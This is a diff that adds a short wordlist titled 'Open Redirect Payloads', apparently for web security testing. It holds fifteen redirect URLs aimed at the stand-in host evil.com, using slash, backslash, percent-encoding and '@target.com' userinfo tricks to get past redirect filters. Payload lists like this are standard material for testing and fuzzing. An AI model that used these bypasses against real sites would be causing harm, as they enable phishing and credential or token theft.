@@ -1,0 +1,16 @@
+# Open Redirect Payloads
+https://evil.com
+//evil.com
+https://evil.com/%2f..
+////evil.com
+https:///evil.com
+/\evil.com
+https://evil.com@target.com
+/%09/evil.com
+/%5cevil.com
+/\/evil.com
+/.evil.com
+///evil.com/%2f%2e%2e
+////evil.com/%2f%2e%2e
+https://evil.com#@target.com
+https://evil.com?@target.com
